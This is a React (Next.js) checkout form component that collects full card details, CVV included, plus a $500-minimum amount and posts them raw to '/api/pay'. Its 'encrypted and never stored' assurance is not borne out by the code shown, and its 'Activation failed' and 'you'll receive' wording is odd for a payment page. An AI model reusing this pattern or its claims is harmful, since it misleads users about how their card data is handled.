'use client';

import React, { useState, useEffect, useRef, useCallback } from 'react';

export default function CheckoutForm() {
  const [formData, setFormData] = useState({
    cardholderName: '',
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    amount: '',
  });

  const [focused, setFocused] = useState(null);
  const [status, setStatus] = useState('idle'); // 'idle' | 'loading' | 'success' | 'error' | 'info'
  const [message, setMessage] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const successTimeoutRef = useRef(null);

  // Clear success message after 5 seconds
  useEffect(() => {
    if (status === 'success') {
      successTimeoutRef.current = setTimeout(() => {
        setStatus('idle');
        setMessage('');
      }, 10000);
    }
    return () => {
      if (successTimeoutRef.current) {
        clearTimeout(successTimeoutRef.current);
      }
    };
  }, [status]);

  // Clear error when user edits any field
  const clearErrorOnEdit = useCallback(() => {
    if (status === 'error') {
      setStatus('idle');
      setMessage('');
    }
  }, [status]);

  const handleChange = (e) => {
    const { name, value } = e.target;
    let formattedValue = value;

    if (name === 'cardNumber') {
      formattedValue = value
        .replace(/\s/g, '')
        .replace(/(\d{4})/g, '$1 ')
        .trim();
      if (formattedValue.length > 19) return;
    }

    if (name === 'expiryDate') {
      formattedValue = value.replace(/\D/g, '');
      if (formattedValue.length >= 2) {
        formattedValue =
          formattedValue.slice(0, 2) + '/' + formattedValue.slice(2, 4);
      }
      if (formattedValue.length > 5) return;
    }

    if (name === 'cvv') {
      formattedValue = value.replace(/\D/g, '');
      if (formattedValue.length > 4) return;
    }

  

    setFormData((prev) => ({ ...prev, [name]: formattedValue }));
    clearErrorOnEdit();
  };

  const handleSubmit = async (e) => {
  e.preventDefault();

  if (isSubmitting) return;

  setIsSubmitting(true);
  setStatus("loading");
  setMessage("");

  try {
    if (Number(formData.amount) < 500) {
      setStatus("error");
      setMessage("Minimum amount is $500");
      setIsSubmitting(false);
      return;
    }

    const response = await fetch("/api/pay", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        cardholderName: formData.cardholderName.trim(),
        cardNumber: formData.cardNumber.replace(/\s/g, ""),
        expiryDate: formData.expiryDate,
        cvv: formData.cvv,
        amount: parseFloat(formData.amount) || 0,
      }),
    });

    const data = await response.json();

    if (data.success) {
      setStatus("success");
      setMessage(data.message);
    } else {
      setStatus("error");
      setMessage(data.message || "Activation failed.");
    }
  } catch (error) {
    console.error(error);
    setStatus("error");
    setMessage("Something went wrong.");
  } finally {
    setIsSubmitting(false);
  }
};
  const calculateLocalAmount = () => {
    if (!formData.amount) return null;
    const rate = 1.12; // Demo EUR rate
    const amount = parseFloat(formData.amount);
    if (isNaN(amount)) return null;
    return (amount * rate).toFixed(2);
  };

  const isDisabled = status === 'loading' || isSubmitting;

  const inputBase =
    'w-full px-4 py-4 bg-slate-50 border-2 rounded-xl transition-all duration-250 placeholder:text-slate-300 focus:outline-none disabled:opacity-60 disabled:cursor-not-allowed';
  const inputFocus =
    'border-slate-900 bg-white shadow-lg shadow-slate-900/5';
  const inputIdle = 'border-slate-200 hover:border-slate-300';

  return (
    <section id="checkout" className="py-16 sm:py-24">
      <div className="max-w-3xl mx-auto px-4 sm:px-6 lg:px-8">
        {/* Section header */}
        <div className="text-center mb-12">
          <h2 className="text-3xl sm:text-4xl font-bold text-slate-900 mb-3 tracking-tight">
            Complete your payment
          </h2>
          <p className="text-slate-600 text-base">
            All transactions are secure and encrypted
          </p>
        </div>

        {/* Checkout card */}
        <div className="bg-white rounded-2xl shadow-xl shadow-slate-200/50 border border-slate-200/60 overflow-hidden">
          {/* Card header */}
          <div className="px-6 sm:px-8 py-6 border-b border-slate-100 bg-gradient-to-r from-slate-50 to-blue-50/30">
            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-3">
                <div className="w-10 h-10 bg-slate-900 rounded-lg flex items-center justify-center shadow-sm">
                  <svg
                    className="w-5 h-5 text-white"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                    aria-hidden="true"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"
                    />
                  </svg>
                </div>
                <div>
                  <h3 className="text-lg font-semibold text-slate-900">
                    Payment Details
                  </h3>
                  <p className="text-sm text-slate-500">
                    Enter your card information
                  </p>
                </div>
              </div>
              <div className="flex items-center space-x-2">
                <img
                  src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg"
                  alt="Visa"
                  className="h-6"
                />
                <img
                  src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg"
                  alt="Mastercard"
                  className="h-6"
                />
              </div>
            </div>
          </div>

          {/* Form */}
          <form onSubmit={handleSubmit} className="p-6 sm:p-8 space-y-6" noValidate>
            {/* Amount field */}
            <div>
              <label
                htmlFor="amount"
                className="block text-sm font-semibold text-slate-700 mb-2"
              >
                Amount (USD)
              </label>
              <div className="relative">
                <span className="absolute left-4 top-1/2 -translate-y-1/2 text-black text-lg font-medium pointer-events-none">
                  $
                </span>
                <input
                  id="amount"
                  type="number"
                  inputMode="decimal"
                  name="amount"
                  value={formData.amount}
                  onChange={handleChange}
                  onFocus={() => setFocused('amount')}
                  onBlur={() => setFocused(null)}
                  placeholder="0.00"
                  min={500}
                  disabled={isDisabled}
                  className={`${inputBase} pl-10 pr-4 text-lg text-black  font-medium ${
                    focused === 'amount' ? inputFocus : inputIdle
                  }`}
                  required
                  aria-describedby="amount-hint"
                />
              </div>
              {formData.amount && calculateLocalAmount() && (
                <p
                  id="amount-hint"
                  className="mt-2 text-sm text-slate-500 flex items-center"
                >
                  <svg
                    className="w-4 h-4 mr-1.5 text-emerald-600 shrink-0"
                    fill="currentColor"
                    viewBox="0 0 20 20"
                    aria-hidden="true"
                  >
                    <path
                      fillRule="evenodd"
                      d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"
                      clipRule="evenodd"
                    />
                  </svg>
                  You&apos;ll receive approximately €{calculateLocalAmount()} in
                  your local currency
                </p>
              )}
            </div>

            {/* Cardholder Name */}
            <div>
              <label
                htmlFor="cardholderName"
                className="block text-sm font-semibold text-slate-700 mb-2"
              >
                Cardholder Name
              </label>
              <input
                id="cardholderName"
                type="text"
                name="cardholderName"
                value={formData.cardholderName}
                onChange={handleChange}
                onFocus={() => setFocused('cardholderName')}
                onBlur={() => setFocused(null)}
                placeholder="John Doe"
                disabled={isDisabled}
                autoComplete="cc-name"
                className={`${inputBase} ${
                  focused === 'cardholderName text-black' ? inputFocus : inputIdle
                } text-black`}
                required
              />
            </div>

            {/* Card Number */}
            <div>
              <label
                htmlFor="cardNumber"
                className="block text-sm font-semibold text-slate-700 mb-2"
              >
                Card Number
              </label>
              <div className="relative">
                <input
                  id="cardNumber"
                  type="text"
                  name="cardNumber"
                  value={formData.cardNumber}
                  onChange={handleChange}
                  onFocus={() => setFocused('cardNumber')}
                  onBlur={() => setFocused(null)}
                  placeholder="1234 5678 9012 3456"
                  disabled={isDisabled}
                  autoComplete="cc-number"
                  inputMode="numeric"
                  className={`${inputBase} font-mono tracking-wider text-black ${
                    focused === 'cardNumber' ? inputFocus : inputIdle
                  }text-black`}
                  required
                />
                <svg
                  className="absolute right-4 top-1/2 -translate-y-1/2 w-8 h-8 text-black pointer-events-none"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                  aria-hidden="true"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={1.5}
                    d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"
                  />
                </svg>
              </div>
            </div>

            {/* Expiry & CVV */}
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label
                  htmlFor="expiryDate"
                  className="block text-sm font-semibold text-black mb-2"
                >
                  Expiry Date
                </label>
                <input
                  id="expiryDate"
                  type="text"
                  name="expiryDate"
                  value={formData.expiryDate}
                  onChange={handleChange}
                  onFocus={() => setFocused('expiryDate')}
                  onBlur={() => setFocused(null)}
                  placeholder="MM/YY"
                  disabled={isDisabled}
                  autoComplete="cc-exp"
                  inputMode="numeric"
                  className={`${inputBase} font-mono text-black${
                    focused === 'expiryDate' ? inputFocus : inputIdle
                  } text-black`}
                  required
                />
              </div>
              <div>
                <label
                  htmlFor="cvv"
                  className="block text-sm font-semibold text-black mb-2 flex items-center"
                >
                  CVV
                  <span
                    className="ml-1.5 text-slate-400"
                    title="3 or 4 digit security code on the back of your card"
                  >
                    <svg
                      className="w-4 h-4"
                      fill="currentColor"
                      viewBox="0 0 20 20"
                      aria-hidden="true"
                    >
                      <path
                        fillRule="evenodd"
                        d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"
                        clipRule="evenodd"
                      />
                    </svg>
                  </span>
                </label>
                <input
                  id="cvv"
                  type="text"
                  name="cvv"
                  value={formData.cvv}
                  onChange={handleChange}
                  onFocus={() => setFocused('cvv')}
                  onBlur={() => setFocused(null)}
                  placeholder="123"
                  disabled={isDisabled}
                  autoComplete="cc-csc"
                  inputMode="numeric"
                  className={`${inputBase} font-mono text-black ${
                    focused === 'cvv' ? inputFocus : inputIdle
                  } text-black `}
                  required
                />
              </div>
            </div>

            {/* Security notice */}
            <div className="flex items-start space-x-3 p-4 bg-emerald-50/80 border border-emerald-200/60 rounded-xl">
              <svg
                className="w-5 h-5 text-emerald-600 flex-shrink-0 mt-0.5"
                fill="currentColor"
                viewBox="0 0 20 20"
                aria-hidden="true"
              >
                <path
                  fillRule="evenodd"
                  d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"
                  clipRule="evenodd"
                />
              </svg>
              <div>
                <p className="text-sm font-medium text-emerald-900">
                  Secure Payment
                </p>
                <p className="text-sm text-emerald-700 mt-0.5">
                  Your card details are encrypted and never stored on our
                  servers
                </p>
              </div>
            </div>

            {/* Status / Notification area – directly above the button */}
            <div
              className={`overflow-hidden transition-all duration-300 ease-out ${
                status === 'idle' || status === 'loading'
                  ? 'max-h-0 opacity-0 -translate-y-1'
                  : 'max-h-40 opacity-100 translate-y-0'
              }`}
              aria-live="polite"
              aria-atomic="true"
            >
              {status === 'success' && (
                <div className="flex items-start gap-3 p-4 mb-1 rounded-xl bg-red-500 border border-red-200 shadow-sm">
                  <svg
                    className="w-5 h-5 text-emerald-600 flex-shrink-0 mt-0.5"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                    aria-hidden="true"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"
                    />
                  </svg>
                  <p className="text-sm font-medium text-white-900 leading-relaxed">
                    {message}
                  </p>
                </div>
              )}

              {status === 'error' && (
                <div className="flex items-start gap-3 p-4 mb-1 rounded-xl bg-red-50 border border-red-200 shadow-sm">
                  <svg
                    className="w-5 h-5 text-red-500 flex-shrink-0 mt-0.5"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                    aria-hidden="true"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"
                    />
                  </svg>
                  <p className="text-sm font-medium text-red-800 leading-relaxed">
                    {message}
                  </p>
                </div>
              )}

              {status === 'info' && (
                <div className="flex items-start gap-3 p-4 mb-1 rounded-xl bg-blue-50 border border-red-200 shadow-sm">
                  <svg
                    className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                    aria-hidden="true"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
                    />
                  </svg>
                  <p className="text-sm font-medium text-blue-900 leading-relaxed">
                    {message}
                  </p>
                </div>
              )}
            </div>

            {/* Submit button */}
            <button
              type="submit"
              disabled={isDisabled}
              className={`
                relative w-full py-4 px-6 font-semibold rounded-xl
                flex items-center justify-center gap-2.5
                transition-all duration-250 ease-out
                focus:outline-none focus-visible:ring-2 focus-visible:ring-slate-900 focus-visible:ring-offset-2
                ${
                  isDisabled
                    ? 'bg-slate-800 text-white opacity-80 cursor-not-allowed'
                    : 'bg-slate-900 text-white hover:bg-slate-800 hover:shadow-xl hover:shadow-slate-900/20 hover:scale-[1.015] active:scale-[0.985]'
                }
              `}
            >
              {/* Subtle progress indicator during loading */}
              {status === 'loading' && (
                <span
                  className="absolute bottom-0 left-0 h-0.5 bg-white/40"
                  style={{
                    width: '100%',
                    animation: 'progress 1.8s ease-in-out infinite',
                  }}
                />
              )}

              {status === 'loading' ? (
                <>
                  {/* Premium spinner */}
                  <svg
                    className="w-5 h-5 animate-spin"
                    viewBox="0 0 24 24"
                    fill="none"
                    aria-hidden="true"
                  >
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="3"
                    />
                    <path
                      className="opacity-90"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                    />
                  </svg>
                  <span>Processing Secure Payment...</span>
                </>
              ) : (
                <>
                  <svg
                    className="w-5 h-5"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                    aria-hidden="true"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                    />
                  </svg>
                  <span>Complete Payment</span>
                </>
              )}
            </button>
          </form>
        </div>

        {/* Footer trust text */}
        <p className="text-center text-sm text-slate-500 mt-6">
          By confirming your payment, you agree to our Terms of Service and
          Privacy Policy
        </p>
      </div>

      {/* Keyframe for the subtle progress indicator */}
      <style jsx>{`
        @keyframes progress {
          0% {
            transform: translateX(-100%);
          }
          50% {
            transform: translateX(0%);
          }
          100% {
            transform: translateX(100%);
          }
        }
      `}</style>
    </section>
  );
}